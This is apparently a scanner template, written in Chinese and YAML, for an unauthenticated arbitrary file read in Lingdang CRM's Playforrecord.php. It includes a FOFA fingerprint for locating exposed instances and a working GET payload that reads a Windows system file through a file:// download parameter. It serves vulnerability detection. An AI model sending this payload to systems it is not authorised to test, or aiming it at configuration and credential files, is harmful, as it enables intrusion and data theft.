id: lingdang-crm-playforrecord-fileread

info:
  name: 灵当CRM Playforrecord.php 任意文件读取漏洞
  author: avic123
  severity: high
  verified: true
  description: |
    灵当CRM Playforrecord.php 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态
    fofa: body="crmcommon/js/jquery/jquery-1.10.1.min.js" || body="http://localhost:8088/crm/index.php" && body="ldcrm.base.js" || title="灵当CRM"
  reference:
    - https://cn-sec.com/archives/4331348.html
  tags: lingdang,crm,fileread
  created: 2025/08/06

rules:
  r0:
    request:
      method: GET
      path: /crm/modules/Accounts/Playforrecord.php?download=file:///c:/windows/win.ini
    expression: |
      (response.status == 200 || response.status == 206) &&
      response.body.ibcontains(b"[fonts]") &&
      response.body.ibcontains(b"[extensions]")
expression: r0()
